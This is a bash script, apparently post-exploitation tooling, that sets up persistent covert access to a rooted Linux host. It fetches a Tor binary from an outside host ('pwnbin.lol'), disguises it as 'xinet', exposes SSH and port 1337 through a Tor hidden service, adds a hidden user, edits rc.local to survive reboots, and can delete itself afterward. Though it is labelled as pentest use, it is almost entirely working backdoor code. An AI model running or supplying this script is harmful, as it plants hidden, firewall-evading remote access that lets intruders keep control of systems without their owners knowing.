#!/bin/bash
# Post-Root, Persistent Tor Access
################################################################
# Hastily configure a tor hidden service using a static binary 
# and cryptic program names. Useful for when you need ssh access
# on a pentest but don't want to deal with traversing firewalls.

torUp(){
# Download+install static tor from your http server, let's call it 'xinet'
cd /tmp
wget $host/$torBin
chmod +x $torBin
mv $torBin /usr/sbin/xinet

# Create a torrc forwarding ssh and call it 'xinet.conf'

cat << _EOF_ > /etc/xinet.conf

SocksPort 9050 # what port to advertise for application connections
SocksBindAddress 127.0.0.1 # accept connections only from localhost
AllowUnverifiedNodes middle,rendezvous
DataDirectory /var/lib/xinet
HiddenServiceDir /var/lib/xinet/.sys
HiddenServicePort 22 127.0.0.1:22 # ssh
HiddenServicePort 1337 127.0.0.1:1337 # l33t
# HiddenServicePort 80 127.0.0.1:80

_EOF_

# Create our tor data directory and user, set permissions (this obviously requires root)
mkdir -p /var/lib/xinet/.sys
useradd -M -s /bin/sh -u 995 xinet || useradd -M -s /bin/sh -u 766 xinet
chmod 700 /var/lib/xinet/.sys
chown -R xinet /var/lib/xinet
# Lazily add a startup directive while preserving the original rc.local directives
grep -v "exit 0" /etc/rc.local > /tmp/.rc.lol
echo "ntpdate ntp.ubuntu.com" >>/tmp/.rc.lol # ensure time is correct!
echo "sudo su xinet -c '/usr/sbin/xinet -f /etc/xinet.conf' &" >>/tmp/.rc.lol 
echo "exit 0" >> /tmp/.rc.lol
cp /tmp/.rc.lol /etc/rc.local
rm -f /tmp/.rc.lol


sudo su xinet -c '/usr/sbin/xinet -f /etc/xinet.conf' 2>/dev/null & # run tor
sleep 3
# Grab your onion:
echo '###### Hidden Service Hostname: ######'
echo '######################################'
echo
cat /var/lib/xinet/hostname || echo Error!
echo
echo '######################################'
echo '######################################'
}

# Edit these:
host=pwnbin.lol
torBin=tor-i686

# Pass -d or --delete on the cli to delete this script afterwards
case $1 in 
-d|--delete)
torUp
echo Deleting...
rm $0
echo 'Deleted!'
;;
-h|--help)
echo "Usage: [$0] or [[$0] -d/--delete] to delete after"
;;
*)
torUp
;;
esac

exit
